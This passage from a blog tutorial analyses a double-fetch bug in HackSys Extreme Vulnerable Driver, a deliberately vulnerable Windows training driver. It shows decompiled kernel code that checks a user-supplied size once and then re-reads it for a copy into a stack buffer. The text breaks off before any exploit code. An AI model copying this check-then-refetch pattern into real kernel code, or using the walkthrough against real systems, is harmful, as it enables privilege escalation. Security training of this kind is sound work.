
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        
      
      
      <link rel="icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.3.1, mkdocs-material-8.5.2+insiders-4.23.5">
    
    
      
        <title>HackSys Extreme Vulnerable Driver 3 - Double Fetch - linxz.tech</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.5014570d.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.cbb835fc.min.css">
        
          
          
          <meta name="theme-color" content="#000000">
        
      
      

    
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=JetBrains+Mono:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"JetBrains Mono";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../../stylesheets/extra.css">
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="green">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#introduction" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="linxz.tech" class="md-header__button md-logo" aria-label="linxz.tech" data-md-component="logo">
      
  <img src="../../../assets/logo.jpg" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            linxz.tech
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              HackSys Extreme Vulnerable Driver 3 - Double Fetch
            
          </span>
        </div>
      </div>
    </div>
    
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            <nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        




  
    <li class="md-tabs__item">
      <a href="../../.." class="md-tabs__link">
        
  
  Linxz' Blog

      </a>
    </li>
  

      
        




  
    <li class="md-tabs__item">
      <a href="../../../about/" class="md-tabs__link">
        
  
  About

      </a>
    </li>
  

      
        




  
    <li class="md-tabs__item">
      <a href="../../../tags/" class="md-tabs__link">
        
  
  Tags

      </a>
    </li>
  

      
        

  




  
    
    
    
      <li class="md-tabs__item">
        <a href="../../" class="md-tabs__link md-tabs__link--active">
          
  
    
  
  Posts

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
                
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="linxz.tech" class="md-nav__button md-logo" aria-label="linxz.tech" data-md-component="logo">
      
  <img src="../../../assets/logo.jpg" alt="logo">

    </a>
    linxz.tech
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linxz' Blog
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
    <li class="md-nav__item">
      <a href="../../../about/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    About
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
    <li class="md-nav__item">
      <a href="../../../tags/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Tags
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
          <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" checked>
        
        
          <label class="md-nav__link" for="__nav_4">
            
  
  <span class="md-ellipsis">
    Posts
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" aria-label="Posts" data-md-level="1">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Posts
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Latest Posts
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2" type="checkbox" id="__nav_4_2" >
        
        
          <label class="md-nav__link" for="__nav_4_2">
            
  
  <span class="md-ellipsis">
    2019
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" aria-label="2019" data-md-level="2">
          <label class="md-nav__title" for="__nav_4_2">
            <span class="md-nav__icon md-icon"></span>
            2019
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../2019/2019-08-31-NetSecFocus-AES-Challenge/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    NetSecFocus BSides Cymru AES Challenge
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../2019/2019-12-8-BAE-ctf-crypto3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    BAE x BSides Chelt CTF
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3" type="checkbox" id="__nav_4_3" >
        
        
          <label class="md-nav__link" for="__nav_4_3">
            
  
  <span class="md-ellipsis">
    2021
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" aria-label="2021" data-md-level="2">
          <label class="md-nav__title" for="__nav_4_3">
            <span class="md-nav__icon md-icon"></span>
            2021
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../2021/2021-11-13-Pwn2Own-2017-Guest-Host-Escape/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Analysis of a VMWare Guest-to-Host Escape from Pwn2Own 2017
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
    
  
  
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
          <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_4" type="checkbox" id="__nav_4_4" checked>
        
        
          <label class="md-nav__link" for="__nav_4_4">
            
  
  <span class="md-ellipsis">
    2022
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" aria-label="2022" data-md-level="2">
          <label class="md-nav__title" for="__nav_4_4">
            <span class="md-nav__icon md-icon"></span>
            2022
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../2022-05-14-HEVD3-StackOverflow/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HackSys Extreme Vulnerable Driver 3 - Stack Overflow + SMEP Bypass
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    HackSys Extreme Vulnerable Driver 3 - Double Fetch
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    HackSys Extreme Vulnerable Driver 3 - Double Fetch
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#introduction" class="md-nav__link">
    <span class="md-ellipsis">
      Introduction
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#double-fetch" class="md-nav__link">
    <span class="md-ellipsis">
      Double Fetch
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reversing-the-driver" class="md-nav__link">
    <span class="md-ellipsis">
      Reversing the Driver
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reversing the Driver">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#locating-the-ioctl-handler" class="md-nav__link">
    <span class="md-ellipsis">
      Locating the IOCTL Handler
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reversing-the-vulnerable-function" class="md-nav__link">
    <span class="md-ellipsis">
      Reversing the Vulnerable Function
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dynamic-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      Dynamic Analysis
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Dynamic Analysis">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#interacting-with-the-driver" class="md-nav__link">
    <span class="md-ellipsis">
      Interacting with the Driver
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Interacting with the Driver">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploit-summary-0x1" class="md-nav__link">
    <span class="md-ellipsis">
      Exploit Summary 0x1
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-started-with-multithreading" class="md-nav__link">
    <span class="md-ellipsis">
      Getting Started with Multithreading
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Getting Started with Multithreading">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploit-summary-0x2" class="md-nav__link">
    <span class="md-ellipsis">
      Exploit Summary 0x2
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exploitation" class="md-nav__link">
    <span class="md-ellipsis">
      Exploitation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exploitation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bypassing-smep" class="md-nav__link">
    <span class="md-ellipsis">
      Bypassing SMEP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#shellcode" class="md-nav__link">
    <span class="md-ellipsis">
      Shellcode
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#fix" class="md-nav__link">
    <span class="md-ellipsis">
      Fix
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#full-exploit" class="md-nav__link">
    <span class="md-ellipsis">
      Full Exploit
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#acknowledgements" class="md-nav__link">
    <span class="md-ellipsis">
      Acknowledgements
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    <span class="md-ellipsis">
      References
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../2022-06-11-HEVD3-MemoryDisclosure/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HackSys Extreme Vulnerable Driver 3 - Memory Disclosure
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
                
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#introduction" class="md-nav__link">
    <span class="md-ellipsis">
      Introduction
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#double-fetch" class="md-nav__link">
    <span class="md-ellipsis">
      Double Fetch
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reversing-the-driver" class="md-nav__link">
    <span class="md-ellipsis">
      Reversing the Driver
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reversing the Driver">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#locating-the-ioctl-handler" class="md-nav__link">
    <span class="md-ellipsis">
      Locating the IOCTL Handler
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reversing-the-vulnerable-function" class="md-nav__link">
    <span class="md-ellipsis">
      Reversing the Vulnerable Function
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dynamic-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      Dynamic Analysis
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Dynamic Analysis">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#interacting-with-the-driver" class="md-nav__link">
    <span class="md-ellipsis">
      Interacting with the Driver
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Interacting with the Driver">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploit-summary-0x1" class="md-nav__link">
    <span class="md-ellipsis">
      Exploit Summary 0x1
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-started-with-multithreading" class="md-nav__link">
    <span class="md-ellipsis">
      Getting Started with Multithreading
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Getting Started with Multithreading">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploit-summary-0x2" class="md-nav__link">
    <span class="md-ellipsis">
      Exploit Summary 0x2
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exploitation" class="md-nav__link">
    <span class="md-ellipsis">
      Exploitation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exploitation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bypassing-smep" class="md-nav__link">
    <span class="md-ellipsis">
      Bypassing SMEP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#shellcode" class="md-nav__link">
    <span class="md-ellipsis">
      Shellcode
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#fix" class="md-nav__link">
    <span class="md-ellipsis">
      Fix
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#full-exploit" class="md-nav__link">
    <span class="md-ellipsis">
      Full Exploit
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#acknowledgements" class="md-nav__link">
    <span class="md-ellipsis">
      Acknowledgements
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    <span class="md-ellipsis">
      References
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  
  
  


  <nav class="md-tags" >
    
      
      
        <a href="../../../tags/#windows-kernel-exploitation" class="md-tag">windows-kernel-exploitation</a>
      
    
  </nav>




<h2 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">&para;</a></h2>
<p>This post is part of a series on Hacksys Extreme Vulnerable Driver, if you have not read my <a href="/Posts/2022-05-14-HEVD3-StackOverflow/">previous post</a> I would suggest reading it unless you're already familiar with kernel exploitation on Windows.</p>
<p>In this post we will be exploring a Double Fetch vulnerability. - we assume that you already have an environment setup to follow along. However, if you don't have an environment setup in this post we use:</p>
<ul>
<li>Windows 10 Pro x64 <abbr title="Redstone 1">RS1</abbr></li>
<li><abbr title="HackSys Extreme Vulnerable Driver">HEVD</abbr> 3.00</li>
</ul>
<p>If you are not sure how to setup a kernel debugging environment you can find plenty of posts of the process online, we will not cover the process in this post.</p>
<hr>

<h1 id="double-fetch">Double Fetch<a class="headerlink" href="#double-fetch" title="Permanent link">&para;</a></h1>
<p>Before covering the vulnerability lets first talk a bit about what a Double Fetch bug actually is. In short a Double Fetch is a specific type of time-of-check to time-of-use bug. The general cause is when a process reads an untrusted variable more than once without re-verifying any checks of the variable on the second read. These bugs are very common in shared memory interfaces. I would highly recommend you read <a href="https://research.nccgroup.com/2022/03/28/whitepaper-double-fetch-vulnerabilities-in-c-and-c/">this research report</a> by Nick Dunn from NCC Group.</p>
<h1 id="reversing-the-driver">Reversing the Driver<a class="headerlink" href="#reversing-the-driver" title="Permanent link">&para;</a></h1>
<p>In this post we will assume that you have read the <a href="https://linxz.tech/post/hevd/2022-05-14-hevd3-stackbufferoverflow/">previous post</a> in which we explore a simple stack buffer overflow in <abbr title="HackSys Extreme Vulnerable Driver">HEVD</abbr>, if you have not read that post I'd recommend you read it as it is a nice introduction to driver exploitation on Windows.</p>
<p>As noted in the previous post the <abbr title="Input Output Request Packet">IRP</abbr> handler is located at <code>sub_140085078</code> however we will refer to this function as <code>IrpDeviceIoCtlHandler</code> going forward.</p>
<h2 id="locating-the-ioctl-handler">Locating the <abbr title="Input Output Control">IOCTL</abbr> Handler<a class="headerlink" href="#locating-the-ioctl-handler" title="Permanent link">&para;</a></h2>
<p>To find the vulnerable function we can simply do a string search for "double fetch" which should lead us to the vulnerable function.</p>
<h2 id="reversing-the-vulnerable-function">Reversing the Vulnerable Function<a class="headerlink" href="#reversing-the-vulnerable-function" title="Permanent link">&para;</a></h2>
<p>Now that we've located the vulnerable function we can begin reversing it and looking for the vulnerability.</p>
<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Vulnerable Function</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-0-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-0-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-0-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-0-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-0-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-0-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-0-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-0-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-0-10">10</a></span>
<span class="normal"><a href="#__codelineno-0-11">11</a></span>
<span class="normal"><a href="#__codelineno-0-12">12</a></span>
<span class="normal"><a href="#__codelineno-0-13">13</a></span>
<span class="normal"><a href="#__codelineno-0-14">14</a></span>
<span class="normal"><a href="#__codelineno-0-15">15</a></span>
<span class="normal"><a href="#__codelineno-0-16">16</a></span>
<span class="normal"><a href="#__codelineno-0-17">17</a></span>
<span class="normal"><a href="#__codelineno-0-18">18</a></span>
<span class="normal"><a href="#__codelineno-0-19">19</a></span>
<span class="normal"><a href="#__codelineno-0-20">20</a></span>
<span class="normal"><a href="#__codelineno-0-21">21</a></span>
<span class="normal"><a href="#__codelineno-0-22">22</a></span>
<span class="normal"><a href="#__codelineno-0-23">23</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="kt">char</span><span class="w"> </span><span class="n">Dst</span><span class="p">[</span><span class="mi">2048</span><span class="p">];</span><span class="w"> </span><span class="c1">// kernel stack allocated buffer</span>
<a id="__codelineno-0-2" name="__codelineno-0-2"></a>
<a id="__codelineno-0-3" name="__codelineno-0-3"></a><span class="n">memset</span><span class="p">(</span><span class="n">Dst</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">Dst</span><span class="p">));</span><span class="w">         </span>
<a id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="n">ProbeForRead</span><span class="p">(</span><span class="n">Address</span><span class="p">,</span><span class="w"> </span><span class="mh">0x10</span><span class="p">,</span><span class="w"> </span><span class="mi">1u</span><span class="p">);</span><span class="w">         </span><span class="c1">// check user-mode buffer Address in user-mode and aligned</span>
<a id="__codelineno-0-5" name="__codelineno-0-5"></a>
<a id="__codelineno-0-6" name="__codelineno-0-6"></a><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span><span class="w"> </span><span class="mi">3u</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[+] UserDoubleFetch-&gt;Buffer: 0x%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">**</span><span class="p">)</span><span class="n">Address</span><span class="p">);</span><span class="w">  </span><span class="c1">//  Address-&gt;Buffer</span>
<a id="__codelineno-0-7" name="__codelineno-0-7"></a><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span><span class="w"> </span><span class="mi">3u</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[+] UserDoubleFetch-&gt;Size: 0x%X</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Address</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">));</span><span class="w">   </span><span class="c1">//  Address-&gt;Size</span>
<a id="__codelineno-0-8" name="__codelineno-0-8"></a>
<a id="__codelineno-0-9" name="__codelineno-0-9"></a><span class="n">check_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Address</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span><span class="w">                                                  </span><span class="c1">//  set v2 = Address-&gt;Size</span>
<a id="__codelineno-0-10" name="__codelineno-0-10"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">check_size</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">2048</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-0-11" name="__codelineno-0-11"></a><span class="w">    </span><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span><span class="w"> </span><span class="mi">3u</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[+] Triggering Double Fetch</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-0-12" name="__codelineno-0-12"></a><span class="w">    </span><span class="n">RtlCopyMemory</span><span class="p">(</span><span class="n">Dst</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">**</span><span class="p">)</span><span class="n">Address</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Address</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">));</span><span class="w"></span>
<a id="__codelineno-0-13" name="__codelineno-0-13"></a>
<a id="__codelineno-0-14" name="__codelineno-0-14"></a><span class="w">    </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-0-15" name="__codelineno-0-15"></a><span class="p">}</span><span class="w"></span>
<a id="__codelineno-0-16" name="__codelineno-0-16"></a>
<a id="__codelineno-0-17" name="__codelineno-0-17"></a><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-0-18" name="__codelineno-0-18"></a><span class="w">    </span><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span><span class="w"> </span><span class="mi">3u</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[-] Invalid Buffer Size: 0x%X</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">CheckSize</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-0-19" name="__codelineno-0-19"></a><span class="w">    </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3221225485</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-0-20" name="__codelineno-0-20"></a><span class="p">}</span><span class="w"></span>
<a id="__codelineno-0-21" name="__codelineno-0-21"></a>
<a id="__codelineno-0-22" name="__codelineno-0-22"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-0-23" name="__codelineno-0-23"></a><span class="p">}</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<p>Starting from the top of the above decompilation we can see that there's a stack allocated buffer <code>Dst</code> that is 2048 bytes, that buffer then gets zero'd out with memset. Following that a call to <code>ProbeForRead</code> verifies that out user-mode buffer is:</p>
<ol>
<li>Actually in user-mode</li>
<li>Aligned correctly</li>
</ol>
<p>Moving down the function we have two <code>DbgPrintEx</code> calls which are there to assist us with reversing the vulnerabilities. These two print statements show us that the format of our user-mode buffer is actually a struct with the first member being the buffer itself and the second member being the size. The below code block is shown to help visualise the situation. <em>Note this below code block is not from <abbr title="HackSys Extreme Vulnerable Driver">HEVD</abbr></em>.</p>
